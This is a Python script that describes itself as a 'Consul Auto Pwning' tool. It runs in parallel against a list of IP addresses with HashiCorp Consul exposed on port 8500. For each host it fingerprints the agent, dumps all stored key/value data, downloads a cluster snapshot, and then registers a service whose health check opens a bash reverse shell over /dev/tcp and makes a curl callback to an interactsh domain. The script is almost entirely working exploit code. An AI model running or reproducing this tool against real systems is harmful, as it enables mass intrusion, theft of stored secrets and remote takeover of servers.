#!/usr/bin/env python3
# Created by: https://github.com/mirfansulaiman
# Consul Auto Pwning
# Flow: 
#      - Get Consul Information
#      - Dump Stored Key/Value (KV)
#      - Dump Snapshot 
#      - RCE !
# Reference: https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations
import os
import sys
import subprocess
import json
import requests
import socket
from datetime import datetime
import concurrent.futures
from requests.exceptions import Timeout

# Colors
RESET = "\033[0m"
WHITE = "\033[1;37m"

# Environment Setup
CURRENT_DIRECTORY = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIRECTORY = os.path.join(CURRENT_DIRECTORY, "result")
SCRIPT_NAME = "consul_pwn"
INTERACTSH = "XXXXXXXXXXXXXXXX.oast.fun"

# Set output filename using epoch timestamp
filename = datetime.now().strftime("%m-%d-%Y") + "_" + str(int(datetime.now().timestamp()))

if not os.path.exists(OUTPUT_DIRECTORY):
    os.mkdir(OUTPUT_DIRECTORY)

def usage():
    print("Consul Auto Pwning")
    print("Usage: consul_pwn.py -l [ip.txt]")
    print("")
    print("-l, --list  List all of IP Address")
    print("")
    sys.exit(1)

if len(sys.argv) < 2:
    usage()

list_target = None
index = 1
while index < len(sys.argv):
    arg = sys.argv[index]
    if arg in ("-l", "--list"):
        index += 1
        list_target = sys.argv[index]
    elif arg in ("-h", "--help"):
        usage()
    else:
        print("Input not understood. See --help for information on using this command.")
        sys.exit(1)
    index += 1

def consul_identify(ip):
    response = requests.get(f"http://{ip}:8500/v1/agent/self", timeout=5)
    data_json = response.json()
    Datacenter = data_json["Config"]["Datacenter"]
    Nodename = data_json["Config"]["NodeName"]
    DataDir = data_json.get("DebugConfig", {}).get("DataDir", None)
    Domain = data_json.get("DebugConfig", {}).get("Domain", None)
    EnableUi = data_json.get("DebugConfig", {}).get("EnableUi", None)
    # Check if the values are None (null)
    if Domain is None:
        Domain = "Null"

    if DataDir is None:
        DataDir = "Null"

    if EnableUi is None:
        EnableUi = "Null"

    with open(f"{OUTPUT_DIRECTORY}/{ip}-{Datacenter}-info.txt", "w") as info_file:
        info_file.write(f"Consul Information: {ip}\n")
        info_file.write(f"Data Center: {Datacenter}\n")
        info_file.write(f"Data Directory: {DataDir}\n")
        info_file.write(f"Node Name: {Nodename}\n")
        info_file.write(f"UI Interface: {EnableUi}\n")
        info_file.write(f"Domain: {Domain}\n")

def consul_extractkey(ip, datacenter):
    print(f"Start: Extract Stored Key {ip}")
    response = requests.get(f"http://{ip}:8500/v1/kv/?recurse=true", timeout=5)
    with open(f"{OUTPUT_DIRECTORY}/{ip}-{datacenter}-key.json", "w") as key_file:
        key_file.write(response.text)
    print(f"Status Code: {response.status_code}")

def consul_snapshot(ip, datacenter):
    print(f"Start: Generate Snapshot {ip}")
    response = requests.get(f"http://{ip}:8500/v1/snapshot?dc={datacenter}", timeout=5)
    with open(f"{OUTPUT_DIRECTORY}/{ip}-{datacenter}-snap.tar.gz", "wb") as snap_file:
        snap_file.write(response.content)
    print(f"Status Code: {response.status_code}")

def consul_rce(ip, datacenter, domain):
    print(f"Start: Lunch RCE, register service at {ip}")
    payload = {
        "Address": "127.0.0.1",
        "check": {
            "Args": [
                "/bin/bash",
                "-c",
                f"bash -i >& /dev/tcp/{domain}/80 0>&1 & curl -H 'Datacenter: {datacenter}' http://{domain}/?ip={ip}",
            ],
            "interval": "10s",
            "Timeout": "864000s"
        },
        "ID": "8719998211137",
        "Name": "web-app-service-backup-6521",
        "Port": 80
    }
    try:
        response = requests.put(
            f"http://{ip}:8500/v1/agent/service/register?replace-existing-checks=true",
            json=payload,
            timeout=5
        )
        response.raise_for_status()
        print(f"Status Code RCE: {response.status_code}")
        status_code = response.status_code

        if 200 <= status_code < 300:
            print("RCE Success")
            with open("ip_rce.txt", "a") as ip_vuln:
               ip_vuln.write(f"IP Address: {ip}\n")
               ip_vuln.write(f"Data Center: {datacenter}\n")
               ip_vuln.write(f"-------------------------------------\n")
            subprocess.run(["sleep", "25"])
            print("Start: Deregister Service ..")
            deRCE = requests.put(f"http://{ip}:8500/v1/agent/service/deregister/8719998211137", timeout=5)
            print(f"Status Code: {deRCE.status_code}")
        elif 400 <= status_code < 550:
            print("[!] RCE Failed ")
    except Timeout:
        print(f"Skipping {ip} - Request timed out")
    except Exception as e:
        print(f"Skipping {ip} - Error: {e}")

if list_target is None:
    print("Invalid target specified!")
    sys.exit(1)

with open("IP_check.txt", "a") as ip_check_file:
    ip_check_file.write("Interact.sh: {}\n".format(INTERACTSH))
    ip_check_file.write("Start Date: {}\n".format(datetime.now()))
    ip_check_file.write("Dir: {}\n".format(CURRENT_DIRECTORY))
    ip_check_file.write("Warming Up ... \n")

def is_port_open(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=10):
            return True
    except (socket.timeout, ConnectionError):
        return False

def process_single_ip(ip):
    with open("IP_check.txt", "a") as ip_check_file:
        ip_check_file.write(f"{ip}\n")

    if not is_port_open(ip, 8500):
        print(f"Skipping {ip} - Port 8500 is closed or timed out")
        return

    try:
        response = requests.get(f"http://{ip}:8500/v1/agent/self", timeout=10)
        response.raise_for_status()
        datacenter = response.json()["Config"]["Datacenter"]
        consul_identify(ip)
        consul_extractkey(ip, datacenter)
        consul_snapshot(ip, datacenter)
        consul_rce(ip, datacenter, INTERACTSH)
    except Timeout:
        print(f"Skipping {ip} - Request timed out")
    except Exception as e:
        print(f"Skipping {ip} - Error: {e}")

def process_file_parallel(file_path):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(process_single_ip, line.strip()) for line in open(file_path)]
        concurrent.futures.wait(futures)

process_file_parallel(list_target)
